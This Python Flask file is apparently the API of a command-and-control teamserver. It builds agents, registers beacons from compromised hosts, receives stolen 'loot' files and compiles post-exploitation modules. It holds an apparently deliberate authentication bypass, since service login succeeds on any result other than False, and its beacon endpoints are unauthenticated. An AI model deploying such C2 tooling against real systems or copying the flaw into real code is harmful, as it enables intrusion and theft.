"""
C2 Teamserver HTTP API.

Provides REST endpoints for operator authentication, service account
integration, agent building, beacon management, and module compilation.
"""

from flask import Flask, request, jsonify
import json
import os

from .auth import OperatorAuthenticator, ServiceAuthenticator, SessionManager
from .builder import AgentBuilder
from .handlers import LootHandler
from .modules import ModuleCompiler


def create_app(config_path='/app/config.json'):
    app = Flask(__name__)

    with open(config_path) as f:
        config = json.load(f)

    # Initialize authentication
    session_mgr = SessionManager()
    op_auth = OperatorAuthenticator(config.get('operators', []))
    svc_auth = ServiceAuthenticator(config.get('service_accounts', []))

    # Initialize subsystems
    builder = AgentBuilder()
    loot = LootHandler()
    module_compiler = ModuleCompiler()

    # In-memory beacon registry
    beacons = {}

    # ---- Operator endpoints ----

    @app.route('/api/operator/login', methods=['POST'])
    def operator_login():
        """Authenticate an operator and return a session token."""
        data = request.get_json()
        result = op_auth.authenticate(data.get('username'), data.get('password'))
        if result:
            token = session_mgr.create_session(result['username'], result['role'])
            return jsonify({'token': token, 'role': result['role']})
        return jsonify({'error': 'Invalid credentials'}), 401

    # ---- Service API endpoints ----

    @app.route('/api/service/auth', methods=['POST'])
    def service_auth():
        """Authenticate a service account and return a session token."""
        data = request.get_json()
        result = svc_auth.authenticate(data.get('username'), data.get('password'))

        # Service auth returns a dict on success, False on wrong password
        if result is not False:
            token = session_mgr.create_session(
                data.get('username'),
                result.get('role', 'service') if isinstance(result, dict) else 'service'
            )
            return jsonify({'token': token, 'status': 'authenticated'})
        return jsonify({'error': 'Authentication failed'}), 401

    # ---- Agent build endpoints ----

    @app.route('/api/agent/build', methods=['POST'])
    def build_agent():
        """Build a new agent binary for target deployment."""
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        session = session_mgr.validate_session(token)
        if not session:
            return jsonify({'error': 'Unauthorized'}), 401

        build_config = request.get_json()
        try:
            result = builder.build(build_config)
            return jsonify(result)
        except ValueError as e:
            return jsonify({'error': str(e)}), 400

    # ---- Beacon endpoints ----

    @app.route('/api/beacon/register', methods=['POST'])
    def beacon_register():
        """Register a new beacon callback from a compromised host."""
        data = request.get_json()
        beacon_id = data.get('id')
        beacons[beacon_id] = {
            'arch': data.get('arch', 'x64'),
            'os': data.get('os', 'windows'),
            'hostname': data.get('hostname', 'unknown'),
            'username': data.get('username', 'unknown'),
            'pid': data.get('pid', 0),
            'registered': True
        }
        return jsonify({'status': 'registered', 'beacon_id': beacon_id})

    @app.route('/api/beacon/<beacon_id>/upload', methods=['POST'])
    def beacon_upload(beacon_id):
        """Handle a file upload (loot) from a beacon."""
        filepath = request.form.get('filepath', 'unknown')
        data = request.files['file'].read()
        result = loot.store_download(beacon_id, filepath, data)
        return jsonify(result)

    # ---- Module endpoints ----

    @app.route('/api/module/compile', methods=['POST'])
    def compile_module():
        """Compile a post-exploitation module for a beacon target."""
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        session = session_mgr.validate_session(token)
        if not session:
            return jsonify({'error': 'Unauthorized'}), 401

        data = request.get_json()
        beacon_id = data.get('beacon_id')
        module_name = data.get('module')

        if beacon_id not in beacons:
            return jsonify({'error': 'Unknown beacon'}), 404

        beacon_info = beacons[beacon_id]

        try:
            result = module_compiler.compile_module(module_name, beacon_info)
            return jsonify(result)
        except ValueError as e:
            return jsonify({'error': str(e)}), 400

    return app
